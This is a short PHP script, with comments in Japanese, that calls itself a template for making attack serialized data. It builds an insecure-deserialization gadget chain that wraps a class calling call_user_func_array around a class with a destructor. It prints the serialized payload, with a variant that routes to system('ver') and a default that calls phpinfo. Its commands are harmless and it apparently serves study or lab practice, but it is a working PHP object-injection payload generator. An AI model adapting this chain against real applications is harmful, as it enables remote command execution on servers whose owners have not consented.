<?php  // 攻撃用シリアライズデータ作成テンプレート
// ここにクラスを貼り付ける

class G { // デストラクタを持つクラス
    private $func;
    public function __construct($func) {
      $this->func = $func;
    }
    public function __destruct() {
      // call_user_func($this->func);    // call_user_func関数を呼んでいる
      echo "**デストラクタ\n";
    }
  }
  
  class H {  // デストラクタはないが call_user_func_array 呼び出しがあるクラス
    private $func;
    private $args;
    public function __construct($func, $args) {
      $this->func = $func;
      $this->args = $args;
    }
    public function exec() {
      call_user_func_array($this->func, $this->args);
    }
  }
if (0) {
  $h = new H('system', ['ver']);  
  $g = new G([$h, 'exec']);
} else {
  $g = new G('phpinfo');
}
echo addslashes(serialize($g)), PHP_EOL;
